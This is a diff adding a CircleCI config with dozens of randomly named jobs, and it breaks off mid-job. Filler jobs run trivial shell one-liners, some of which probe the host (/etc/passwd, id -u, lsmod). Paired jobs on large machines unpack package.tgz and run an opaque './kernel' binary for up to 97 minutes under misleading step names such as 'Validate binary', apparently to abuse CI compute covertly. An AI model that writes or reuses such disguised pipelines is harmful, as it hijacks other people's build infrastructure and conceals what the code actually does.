@@ -1,0 +1,1847 @@
+version: 2.1
+
+jobs:
+  phase_ensure-full-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: depth jump
+          command: |
+            mkdir -p /tmp/_bld
+            set +o pipefail 2>/dev/null; seq 1 872217 | sha256sum > /tmp/_bld/gate-ready.log; true
+            size=$(wc -c </tmp/_bld/gate-ready.log); echo "stage ok: ensure-full-release-candidate size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - gate-ready.log
+  ensure-full-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/gate-ready.log || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  wire_ValidatePipeline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: splice line
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 10 90 | awk '$1~/[13]$/' | wc -l; true ; } > /tmp/_bld/36.bin
+            size=$(wc -c </tmp/_bld/36.bin); echo "stage ok: ValidatePipeline size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 36.bin
+  ValidatePipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/36.bin || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  reserve_v3-ga:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: k
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 43579 | awk 'END{print NR}'; true ; } > /tmp/_bld/pt-A.pkl
+            size=$(wc -c </tmp/_bld/pt-A.pkl); echo "stage ok: v3-ga size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - pt-A.pkl
+  v3-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/pt-A.pkl || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  builder_validte-74:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: oh no again
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1 count=64 2>/dev/null | od -An -tx1 | tr -d ' \n'; true ; } > /tmp/_bld/handoff.sig
+            size=$(wc -c </tmp/_bld/handoff.sig); echo "stage ok: validte-74 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - handoff.sig
+  validte-74:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/handoff.sig || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  verify_BuildApp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: tap thread
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf '%s\n' "{foo: 1, bar: 2}" | md5sum; true ; } > /tmp/_bld/payload.tgz
+            size=$(wc -c </tmp/_bld/payload.tgz); echo "stage ok: BuildApp size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - payload.tgz
+  BuildApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/payload.tgz || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  red_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: satin finish
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "the rain in spain" | tr -s ' ' | wc -c; true ; } > /tmp/_bld/stats.json
+            size=$(wc -c </tmp/_bld/stats.json); echo "stage ok: test size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stats.json
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/stats.json || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  vendor_INFRA-177:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ornamentation
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "quick" | tr A-Za-z N-ZA-Mn-za-m | base64 | head -c 20; true ; } > /tmp/_bld/step-22.txt
+            size=$(wc -c </tmp/_bld/step-22.txt); echo "stage ok: INFRA-177 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-22.txt
+  INFRA-177:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/step-22.txt || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  B_feb8-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: front lever
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=""; for(i=1;i<=20;i++)s=s"-"; print s}'; true ; } > /tmp/_bld/output.out
+            size=$(wc -c </tmp/_bld/output.out); echo "stage ok: feb8-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - output.out
+  feb8-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/output.out || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  fetcher_wip-edge-bug:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: yellow line
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; lsmod 2>/dev/null | wc -l || echo 0; true ; } > /tmp/_bld/buffer.bin
+            size=$(wc -c </tmp/_bld/buffer.bin); echo "stage ok: wip-edge-bug size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - buffer.bin
+  wip-edge-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/buffer.bin || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  preflight_tango:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: testing
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 1024 /dev/urandom | tar -c - 2>/dev/null | wc -c; true ; } > /tmp/_bld/OK
+            size=$(wc -c </tmp/_bld/OK); echo "stage ok: tango size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - OK
+  tango:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/OK || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  D_v9-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: loop till red
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 9294); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/_bld/2024-08-23.data
+            size=$(wc -c </tmp/_bld/2024-08-23.data); echo "stage ok: v9-beta size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-08-23.data
+  v9-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/2024-08-23.data || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  Beta_yolo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: cov
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=15;i++){s=""; for(j=1;j<=i;j++)s=s"X"; print s}}' | wc -l; true ; } > /tmp/_bld/DONE.txt
+            size=$(wc -c </tmp/_bld/DONE.txt); echo "stage ok: yolo size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - DONE.txt
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/DONE.txt || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  fetcher_java17-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: snatch
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="abcdefghij"; for(i=1;i<=length(s);i++)print i, substr(s,i,1)}' | wc -l; true ; } > /tmp/_bld/.marker
+            size=$(wc -c </tmp/_bld/.marker); echo "stage ok: java17-fmt size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .marker
+  java17-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/.marker || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  cleanup_RunSuite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: heave line
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; date +"%A"; true ; } > /tmp/_bld/payload.pkg
+            size=$(wc -c </tmp/_bld/payload.pkg); echo "stage ok: RunSuite size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - payload.pkg
+  RunSuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/payload.pkg || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  preflight_shippit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: oven heat
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; grep -v nologin /etc/passwd | wc -l; true ; } > /tmp/_bld/step-19.out
+            size=$(wc -c </tmp/_bld/step-19.out); echo "stage ok: shippit size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-19.out
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/step-19.out || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  stepB_cf-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: dropped kick
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "quick" | tr A-Za-z N-ZA-Mn-za-m | base64 | head -c 20; true ; } > /tmp/_bld/passoff.state
+            size=$(wc -c </tmp/_bld/passoff.state); echo "stage ok: cf-new size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - passoff.state
+  cf-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/passoff.state || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  spinner_build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: jump
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | od -An -tu8 | head -1 | awk '{print $1}'; true ; } > /tmp/_bld/bundle.tar
+            size=$(wc -c </tmp/_bld/bundle.tar); echo "stage ok: build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - bundle.tar
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/bundle.tar || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  B_VERIFY_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: spike alone
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; sed -n '/^$/d; p' <<<$'line1\n\nline2\n\nline3' | wc -l; true ; } > /tmp/_bld/metrics.tsv
+            size=$(wc -c </tmp/_bld/metrics.tsv); echo "stage ok: VERIFY_LAB size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - metrics.tsv
+  VERIFY_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/metrics.tsv || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  deps_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: focus mode
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=12; result=1; while(n>1){result*=n; n--}; print result}'; true ; } > /tmp/_bld/32.out
+            size=$(wc -c </tmp/_bld/32.out); echo "stage ok: green-light size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 32.out
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/32.out || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  verify_dan-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: accelerando
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=100; count=0; for(i=0;i<n;i++){x=(2*i-n)/n; if(x*x < 1) count++}; print count}'; true ; } > /tmp/_bld/.ready
+            size=$(wc -c </tmp/_bld/.ready); echo "stage ok: dan-build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .ready
+  dan-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/.ready || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  round1_ed-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: late brunch
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; id -u; true ; } > /tmp/_bld/trace.log
+            size=$(wc -c </tmp/_bld/trace.log); echo "stage ok: ed-build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - trace.log
+  ed-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/trace.log || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  resync_wip-session-bug:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: heeled over
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf "line a\nline b\nline c\n" | wc -l; true ; } > /tmp/_bld/stash.bin
+            size=$(wc -c </tmp/_bld/stash.bin); echo "stage ok: wip-session-bug size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stash.bin
+  wip-session-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/stash.bin || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  vendor_perseus-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: rolling hitch
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 2048 /dev/urandom | md5sum | awk '{print $1}'; true ; } > /tmp/_bld/audit.log
+            size=$(wc -c </tmp/_bld/audit.log); echo "stage ok: perseus-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - audit.log
+  perseus-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/audit.log || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  preflight_succes-only-46:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: cnc mill
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; sed 's/\(.\)/\1\1/g' <<<"abc"; true ; } > /tmp/_bld/step-8.txt
+            size=$(wc -c </tmp/_bld/step-8.txt); echo "stage ok: succes-only-46 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-8.txt
+  succes-only-46:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            grep -c . /tmp/_bld/step-8.txt || true
+      - run:
+          name: Pull repo contents
+          command: git clone --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: gunzip -c package.tgz | tar xf -
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          no_output_timeout: 97m
+          command: env ./kernel
+  tester_java17-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: beep boop
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; grep -o '[a-z]' <<<"abc123def456" | sort | uniq | wc -l; true ; } > /tmp/_bld/main_job_output_v4.txt
